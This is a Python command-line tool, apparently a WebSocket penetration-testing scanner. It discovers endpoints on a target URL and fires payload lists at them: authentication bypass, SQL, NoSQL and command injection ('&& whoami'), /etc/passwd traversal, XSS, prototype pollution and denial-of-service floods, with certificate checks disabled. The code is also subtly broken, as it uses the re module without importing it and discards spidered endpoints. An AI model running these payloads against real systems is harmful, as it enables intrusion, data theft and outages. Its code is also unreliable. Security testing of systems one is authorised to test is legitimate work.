#!/usr/bin/env python3
import websocket
import json
import threading
import time
import ssl
import base64
import hmac
import hashlib
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Dict, Any, Optional
import random
import string
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

@dataclass
class WebSocketVulnerability:
    endpoint: str
    vulnerability: str
    risk: str
    evidence: str
    payload: str = ""
    exploitation: str = ""

class WebSocketPentester:
    def __init__(self, base_url, headers=None):
        self.base_url = base_url
        self.headers = headers or {}
        self.vulnerabilities = []
        self.discovered_endpoints = []
        self.connected_sockets = {}
        
        # Payload libraries
        self.fuzzing_payloads = [
            # Overflow payloads
            "A" * 10000,
            "A" * 100000,
            "\x00" * 1000,
            # JSON injection
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            # SQL injection through WS
            "' OR '1'='1' --",
            "'; DROP TABLE users --",
            # Command injection
            "| ls -la",
            "&& whoami",
            # Path traversal
            "../../../etc/passwd",
            # XSS vectors
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            # Special characters
            "\r\n\r\n",
            "\x00\x01\x02",
            # Unicode attacks
            "\u0000\u0001\u0002",
            "%00%01%02"
        ]
        
        self.auth_bypass_payloads = [
            '{"auth": false}',
            '{"authenticated": true}',
            '{"token": "admin"}',
            '{"user": "admin", "password": "admin"}',
            '{"role": "admin"}',
            '{"isAdmin": true}'
        ]

    def discover_websocket_endpoints(self, common_paths=None):
        """Discover WebSocket endpoints through common paths and spidering"""
        print(f"{Fore.CYAN}[*] Discovering WebSocket endpoints...")
        
        if common_paths is None:
            common_paths = [
                "/ws", "/websocket", "/socket", "/wss",
                "/api/ws", "/api/websocket", "/api/socket",
                "/chat", "/live", "/realtime", "/updates",
                "/notifications", "/stream", "/events",
                "/rtc", "/webrtc", "/signal"
            ]
        
        discovered = []
        
        for path in common_paths:
            ws_url = self.base_url.replace("http", "ws") + path
            wss_url = self.base_url.replace("http", "wss") + path
            
            for url in [ws_url, wss_url]:
                if self._test_websocket_connection(url):
                    discovered.append(url)
                    print(f"{Fore.GREEN}[+] Found WebSocket: {url}")
        
        # Additional discovery through HTTP responses
        self._spider_for_websockets()
        
        self.discovered_endpoints = discovered
        return discovered

    def _test_websocket_connection(self, url):
        """Test if a WebSocket endpoint exists and is accessible"""
        try:
            ws = websocket.create_connection(
                url,
                header=self.headers,
                timeout=5,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            ws.close()
            return True
        except:
            return False

    def _spider_for_websockets(self):
        """Spider the application to find WebSocket endpoints"""
        try:
            import requests
            response = requests.get(self.base_url, headers=self.headers, timeout=10)
            
            # Look for WebSocket connections in JavaScript
            ws_patterns = [
                r'new WebSocket\("([^"]+)"\)',
                r'ws://[^"\']+',
                r'wss://[^"\']+',
                r'socket\.io[^"\']+',
            ]
            
            for pattern in ws_patterns:
                matches = re.finditer(pattern, response.text)
                for match in matches:
                    ws_url = match.group(1) if match.groups() else match.group(0)
                    if not ws_url.startswith(('ws://', 'wss://')):
                        ws_url = urljoin(self.base_url.replace("http", "ws"), ws_url)
                    
                    if self._test_websocket_connection(ws_url):
                        if ws_url not in self.discovered_endpoints:
                            self.discovered_endpoints.append(ws_url)
                            print(f"{Fore.GREEN}[+] Spidered WebSocket: {ws_url}")
        except:
            pass

    def test_authentication_bypass(self, ws_url):
        """Test for authentication bypass vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing authentication bypass on {ws_url}")
        
        try:
            # Try connecting without authentication
            ws = websocket.create_connection(
                ws_url,
                header=self.headers,
                timeout=10,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            
            # Send authentication bypass payloads
            for payload in self.auth_bypass_payloads:
                try:
                    ws.send(payload)
                    response = ws.recv()
                    
                    if "success" in response.lower() or "welcome" in response.lower():
                        self.vulnerabilities.append(WebSocketVulnerability(
                            endpoint=ws_url,
                            vulnerability="Authentication Bypass",
                            risk="HIGH",
                            evidence=f"Success with payload: {payload}",
                            payload=payload,
                            exploitation=f"ws.send('{payload}')"
                        ))
                        print(f"{Fore.RED}[!] Authentication bypass possible with: {payload}")
                        
                except:
                    continue
            
            ws.close()
            
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Authentication test failed: {e}")

    def test_message_injection(self, ws_url):
        """Test for message injection vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing message injection on {ws_url}")
        
        try:
            ws = websocket.create_connection(
                ws_url,
                header=self.headers,
                timeout=10,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            
            injection_payloads = [
                # Command injection
                '{"command": "echo vulnerable"}',
                '{"action": "exec", "cmd": "whoami"}',
                # SQL injection
                '{"query": "SELECT * FROM users"}',
                '{"username": "admin\\' OR \\'1\\'=\\'1"}',
                # NoSQL injection
                '{"$where": "this.constructor.constructor(\\'return process\\')().env"}',
                # Prototype pollution
                '{"__proto__": {"isAdmin": true}}',
                # Template injection
                '{"template": "{{7*7}}"}',
                '{"name": "${7*7}"}'
            ]
            
            for payload in injection_payloads:
                try:
                    ws.send(payload)
                    response = ws.recv()
                    
                    # Analyze response for successful injection
                    if self._detect_injection_success(response, payload):
                        self.vulnerabilities.append(WebSocketVulnerability(
                            endpoint=ws_url,
                            vulnerability="Message Injection",
                            risk="HIGH",
                            evidence=f"Injection successful: {payload}",
                            payload=payload,
                            exploitation=f"ws.send('{payload}')"
                        ))
                        print(f"{Fore.RED}[!] Message injection possible: {payload}")
                        
                except:
                    continue
            
            ws.close()
            
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Message injection test failed: {e}")

    def _detect_injection_success(self, response, payload):
        """Detect if injection was successful based on response"""
        success_indicators = [
            "49",  # 7*7 result
            "whoami", "root", "administrator",
            "SELECT", "FROM", "WHERE",
            "process.env", "require(",
            "vulnerable", "executed"
        ]
        
        response_lower = response.lower()
        for indicator in success_indicators:
            if indicator.lower() in response_lower:
                return True
        return False

    def test_cross_site_websocket_hijacking(self, ws_url):
        """Test for Cross-Site WebSocket Hijacking (CSWSH)"""
        print(f"{Fore.CYAN}[*] Testing Cross-Site WebSocket Hijacking on {ws_url}")
        
        try:
            # Test without Origin header
            headers_no_origin = self.headers.copy()
            if 'Origin' in headers_no_origin:
                del headers_no_origin['Origin']
            
            ws = websocket.create_connection(
                ws_url,
                header=headers_no_origin,
                timeout=10,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            
            # If connection succeeds without Origin, might be vulnerable
            ws.send("test")
            response = ws.recv()
            
            self.vulnerabilities.append(WebSocketVulnerability(
                endpoint=ws_url,
                vulnerability="Cross-Site WebSocket Hijacking",
                risk="MEDIUM",
                evidence="Connection accepted without Origin header",
                payload="No Origin header",
                exploitation="var ws = new WebSocket('{ws_url}'); ws.send('malicious');"
            ))
            print(f"{Fore.RED}[!] Potential CSWSH vulnerability - accepts connections without Origin")
            
            ws.close()
            
        except Exception as e:
            print(f"{Fore.YELLOW}[-] CSWSH test failed: {e}")

    def test_denial_of_service(self, ws_url):
        """Test for Denial of Service vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing DoS vulnerabilities on {ws_url}")
        
        dos_payloads = [
            # Large payload
            "A" * 1000000,
            # Many small rapid messages
            "A" * 1000,
            # Malformed frames
            "\x00\x01\x02\x03\x04",
            # Compression bombs
            '{"compressed": "' + "A" * 50000 + '"}',
            # Deeply nested JSON
            '{"a": {"a": {"a": {"a": {"a": "deep"}}}}}' * 100
        ]
        
        for payload in dos_payloads:
            try:
                start_time = time.time()
                ws = websocket.create_connection(
                    ws_url,
                    header=self.headers,
                    timeout=30,
                    sslopt={"cert_reqs": ssl.CERT_NONE}
                )
                
                # Send payload multiple times
                for i in range(10):
                    ws.send(payload)
                    try:
                        ws.recv()
                    except:
                        break
                
                ws.close()
                end_time = time.time()
                
                if end_time - start_time > 10:
                    self.vulnerabilities.append(WebSocketVulnerability(
                        endpoint=ws_url,
                        vulnerability="Potential DoS",
                        risk="MEDIUM",
                        evidence=f"Slow response with payload type: {payload[:50]}",
                        payload=payload[:100],
                        exploitation=f"for(let i=0;i<1000;i++) ws.send('{payload[:100]}...')"
                    ))
                    print(f"{Fore.RED}[!] Potential DoS with payload: {payload[:50]}...")
                    
            except Exception as e:
                print(f"{Fore.YELLOW}[-] DoS test failed with {payload[:50]}: {e}")

    def test_message_fuzzing(self, ws_url):
        """Fuzz WebSocket messages with various payloads"""
        print(f"{Fore.CYAN}[*] Fuzzing WebSocket messages on {ws_url}")
        
        try:
            ws = websocket.create_connection(
                ws_url,
                header=self.headers,
                timeout=10,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            
            for payload in self.fuzzing_payloads:
                try:
                    ws.send(payload)
                    response = ws.recv()
                    
                    # Check for errors or unusual behavior
                    if self._detect_fuzzing_vulnerability(response):
                        self.vulnerabilities.append(WebSocketVulnerability(
                            endpoint=ws_url,
                            vulnerability="Input Validation Bypass",
                            risk="MEDIUM",
                            evidence=f"Unusual response to fuzzing payload",
                            payload=payload[:100],
                            exploitation=f"ws.send('{payload[:100]}...')"
                        ))
                        print(f"{Fore.RED}[!] Input validation issue with: {payload[:50]}...")
                        
                except websocket.WebSocketTimeoutException:
                    print(f"{Fore.YELLOW}[-] Timeout with payload: {payload[:50]}...")
                except Exception as e:
                    print(f"{Fore.YELLOW}[-] Error with payload {payload[:50]}: {e}")
            
            ws.close()
            
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Fuzzing test failed: {e}")

    def _detect_fuzzing_vulnerability(self, response):
        """Detect potential vulnerabilities from fuzzing responses"""
        vulnerability_indicators = [
            "error", "exception", "stack trace", "undefined",
            "null pointer", "segmentation fault", "memory",
            "corrupt", "overflow", "infinite", "timeout"
        ]
        
        response_lower = str(response).lower()
        for indicator in vulnerability_indicators:
            if indicator in response_lower:
                return True
        return False

    def test_socket_io_vulnerabilities(self, ws_url):
        """Test Socket.IO specific vulnerabilities"""
        if "socket.io" not in ws_url:
            return
            
        print(f"{Fore.CYAN}[*] Testing Socket.IO vulnerabilities on {ws_url}")
        
        socketio_payloads = [
            '42["message", "test"]',
            '42["connect", {"token": "malicious"}]',
            '42["auth", {"isAdmin": true}]',
            '51{"sid":"malicious","upgrades":[]}'
        ]
        
        for payload in socketio_payloads:
            try:
                ws = websocket.create_connection(
                    ws_url,
                    header=self.headers,
                    timeout=10,
                    sslopt={"cert_reqs": ssl.CERT_NONE}
                )
                
                ws.send(payload)
                response = ws.recv()
                
                if "40" not in response:  # If not getting connection error
                    self.vulnerabilities.append(WebSocketVulnerability(
                        endpoint=ws_url,
                        vulnerability="Socket.IO Protocol Manipulation",
                        risk="MEDIUM",
                        evidence=f"Accepted manipulated Socket.IO message",
                        payload=payload,
                        exploitation=f"ws.send('{payload}')"
                    ))
                    print(f"{Fore.RED}[!] Socket.IO manipulation possible: {payload}")
                
                ws.close()
                
            except Exception as e:
                print(f"{Fore.YELLOW}[-] Socket.IO test failed: {e}")

    def test_sensitive_data_exposure(self, ws_url):
        """Test for sensitive data exposure through WebSockets"""
        print(f"{Fore.CYAN}[*] Testing for sensitive data exposure on {ws_url}")
        
        try:
            ws = websocket.create_connection(
                ws_url,
                header=self.headers,
                timeout=10,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            
            # Subscribe to various channels/topics
            subscription_payloads = [
                '{"action": "subscribe", "channel": "all"}',
                '{"type": "subscribe", "topic": "*"}',
                '{"event": "subscribe", "rooms": ["*"]}',
                '{"method": "subscribe", "params": ["admin", "users", "system"]}'
            ]
            
            sensitive_patterns = [
                r'password[=:]["\']([^"\']+)["\']',
                r'token[=:]["\']([^"\']+)["\']',
                r'api[_-]key[=:]["\']([^"\']+)["\']',
                r'secret[=:]["\']([^"\']+)["\']',
                r'[0-9]{4}[- ][0-9]{4}[- ][0-9]{4}[- ][0-9]{4}',  # Credit card
                r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}',  # Email
            ]
            
            for payload in subscription_payloads:
                ws.send(payload)
                
                # Collect multiple responses
                for _ in range(10):
                    try:
                        response = ws.recv()
                        
                        # Check for sensitive data
                        for pattern in sensitive_patterns:
                            matches = re.findall(pattern, response, re.IGNORECASE)
                            if matches:
                                self.vulnerabilities.append(WebSocketVulnerability(
                                    endpoint=ws_url,
                                    vulnerability="Sensitive Data Exposure",
                                    risk="HIGH",
                                    evidence=f"Found sensitive data: {matches[0][:20]}...",
                                    payload=payload,
                                    exploitation=f"ws.send('{payload}')"
                                ))
                                print(f"{Fore.RED}[!] Sensitive data exposed: {matches[0][:20]}...")
                                
                    except websocket.WebSocketTimeoutException:
                        break
                    except:
                        continue
            
            ws.close()
            
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Sensitive data test failed: {e}")

    def perform_comprehensive_scan(self):
        """Perform comprehensive WebSocket security assessment"""
        print(f"{Fore.CYAN}[*] Starting comprehensive WebSocket security scan")
        
        # Discover endpoints
        self.discover_websocket_endpoints()
        
        if not self.discovered_endpoints:
            print(f"{Fore.RED}[-] No WebSocket endpoints discovered")
            return
        
        # Test each endpoint
        for endpoint in self.discovered_endpoints:
            print(f"\n{Fore.CYAN}[*] Testing endpoint: {endpoint}")
            
            self.test_authentication_bypass(endpoint)
            self.test_message_injection(endpoint)
            self.test_cross_site_websocket_hijacking(endpoint)
            self.test_denial_of_service(endpoint)
            self.test_message_fuzzing(endpoint)
            self.test_socket_io_vulnerabilities(endpoint)
            self.test_sensitive_data_exposure(endpoint)
            
            # Add delay between endpoints to avoid overwhelming the server
            time.sleep(1)

    def generate_report(self):
        """Generate comprehensive security report"""
        print(f"\n{Fore.CYAN}" + "="*80)
        print("WEB SOCKET SECURITY ASSESSMENT REPORT")
        print("="*80)
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}No vulnerabilities found!")
            return
        
        # Group by risk level
        risk_groups = {}
        for vuln in self.vulnerabilities:
            if vuln.risk not in risk_groups:
                risk_groups[vuln.risk] = []
            risk_groups[vuln.risk].append(vuln)
        
        # Print by risk level
        for risk in ['HIGH', 'MEDIUM', 'LOW']:
            if risk in risk_groups:
                print(f"\n{Fore.RED}{risk} RISK FINDINGS ({len(risk_groups[risk])}):")
                print("-" * 50)
                
                for vuln in risk_groups[risk]:
                    print(f"\n{Fore.YELLOW}Endpoint: {vuln.endpoint}")
                    print(f"Vulnerability: {vuln.vulnerability}")
                    print(f"Evidence: {vuln.evidence}")
                    if vuln.payload:
                        print(f"Payload: {vuln.payload}")
                    if vuln.exploitation:
                        print(f"Exploitation: {vuln.exploitation}")
                    print("-" * 30)
        
        # Summary
        total = len(self.vulnerabilities)
        high = len(risk_groups.get('HIGH', []))
        medium = len(risk_groups.get('MEDIUM', []))
        low = len(risk_groups.get('LOW', []))
        
        print(f"\n{Fore.CYAN}SUMMARY:")
        print(f"Total Findings: {total}")
        print(f"High Risk: {high}")
        print(f"Medium Risk: {medium}")
        print(f"Low Risk: {low}")

def main():
    parser = argparse.ArgumentParser(description='WebSocket Security Testing Tool')
    parser.add_argument('url', help='Base URL to test (http:// or https://)')
    parser.add_argument('--headers', help='Custom headers (JSON format)')
    parser.add_argument('--endpoints', help='Custom endpoints file (one per line)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout in seconds')
    
    args = parser.parse_args()
    
    # Prepare headers
    headers = {}
    if args.headers:
        headers.update(json.loads(args.headers))
    
    # Initialize pentester
    pentester = WebSocketPentester(args.url, headers)
    
    # Load custom endpoints if provided
    if args.endpoints:
        with open(args.endpoints, 'r') as f:
            custom_endpoints = [line.strip() for line in f if line.strip()]
            pentester.discovered_endpoints.extend(custom_endpoints)
    
    # Run comprehensive scan
    pentester.perform_comprehensive_scan()
    
    # Generate report
    pentester.generate_report()

if __name__ == "__main__":
    main()
